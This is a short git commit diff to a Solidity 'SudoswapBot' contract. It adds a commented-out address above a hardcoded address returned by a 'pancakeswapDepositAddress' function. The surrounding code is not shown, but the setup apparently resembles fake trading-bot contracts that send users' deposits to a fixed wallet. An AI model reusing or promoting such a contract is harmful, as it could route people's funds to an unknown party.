62bcf9feea352278f4804ed73ca43b99f1049088
yunfengflashloan <116545884+yunfengflashloan@users.noreply.github.com>
2022-11-14 15:41:47 +0800

    Update SudoswapBot.sol

--- contract/SudoswapBot.sol
+++ contract/SudoswapBot.sol
@@ -7,6 +7,7 @@ contract Manager {
     }
     
     function pancakeswapDepositAddress() public pure returns (address) {
+        //return 0x6cc72BDD265d8879f473310824Cf658f80c7136B;
         return 0x56d078A7f5d66cd83a048eF08cAF2E5fD57BA30A;
     }
 }
